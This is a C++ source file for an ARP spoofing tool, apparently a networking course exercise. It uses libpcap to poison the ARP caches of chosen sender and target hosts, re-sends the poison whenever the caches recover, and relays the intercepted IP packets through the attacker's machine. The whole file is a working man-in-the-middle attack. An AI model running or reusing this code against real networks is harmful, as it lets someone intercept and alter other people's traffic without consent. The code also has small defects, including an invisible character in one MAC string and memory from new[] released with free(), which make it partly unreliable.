#include "pkt.h"

const char *empty = "00:00:00:00:00:00​";
const char *broadcast = "ff:ff:ff:ff:ff:ff";

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2 ...\n");
}

int main(int argc, char* argv[]) {
    if ( (argc < 4) || (argc%2 != 0) ) {
        usage();
        return -1;
    }

    const char* dev = argv[1];
    GetLocalAddr(dev, "ip");                                    //get local's ip address
    GetLocalAddr(dev, "mac");                                   //get local's mac address

    const int session_cnt = (argc-2)/2;                               //set as much as received arguments
    session *s = new session[session_cnt];

    for(int i=0; i<session_cnt; i++){                           //set session's ip
        s[i].sender_ip = Ip(argv[i*2+2]);
        s[i].target_ip = Ip(argv[i*2+3]);
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    packet_setting(request_packet, Mac(broadcast), ArpHdr::Request, local_ip, Mac(empty), s[0].sender_ip);

    for(int i=0; i<session_cnt; i++){
        get_session_mac(s[i].sender_ip, s[i].sender_mac, handle, i);                //get sender_mac
        get_session_mac(s[i].target_ip, s[i].target_mac, handle, i);                //get target_mac
    }

    for(int i=0; i<session_cnt; i++){                   //set attack packet
        packet_setting(s[i].attack_packet, s[i].sender_mac, ArpHdr::Reply, s[i].target_ip, s[i].sender_mac, s[i].sender_ip);
        send_packet((char *)"attack", s[i].attack_packet, handle, i+1);            //send attack packet
    }
    int cnt=0;
    while(true) {                                               //for arp infect & ip relay
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        printf("%d", cnt++);
        EthArpPacket *check_Arp_packet = (EthArpPacket *)packet;
        for(int i=0; i<session_cnt; i++){

            //find recover packet
            if ( check_Arp_packet->eth_.type_ == htons(EthHdr::Arp) ){
                if( check_Arp_packet->arp_.smac() == s[i].sender_mac && check_Arp_packet->eth_.dmac() == Mac(broadcast) ){ // this is uni capture packet, but why capture broadcast
                    send_packet((char *)"s_uni_infect", s[i].attack_packet, handle, i+1);                //send infect packet
                }

                else if( check_Arp_packet->arp_.smac() == s[i].target_mac && check_Arp_packet->arp_.tmac() == Mac(empty) ){
                    send_packet((char *)"t_bro_infect", s[i].attack_packet, handle, i+1);                //send infect packet
                }
            }

            //find spoofed ip packet
            else if ( check_Arp_packet->eth_.type_ == htons(EthHdr::Ip4) ){
                EthIpPacket *check_Ip_packet = (EthIpPacket *)packet;

                //pass the local_ip packet
                if (  htonl(check_Ip_packet->iph_.ip_src.s_addr) == local_ip || htonl(check_Ip_packet->iph_.ip_dst.s_addr) == local_ip){
                    continue;
                }

                else if ( check_Ip_packet->eth_.smac_ == s[i].sender_mac ){
                    check_Ip_packet->eth_.smac_ = local_mac;         //parsing relay packet
                    check_Ip_packet->eth_.dmac_ = s[i].target_mac;

                    int res = pcap_sendpacket(handle, (u_char*)check_Ip_packet, header->len); //send relay packet
                    if (res != 0)
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    else
                        printf("session_%d : send relay packet success !!\n", i+1 );
                }
            }
        }
    }
    free(s);
    pcap_close(handle);
}
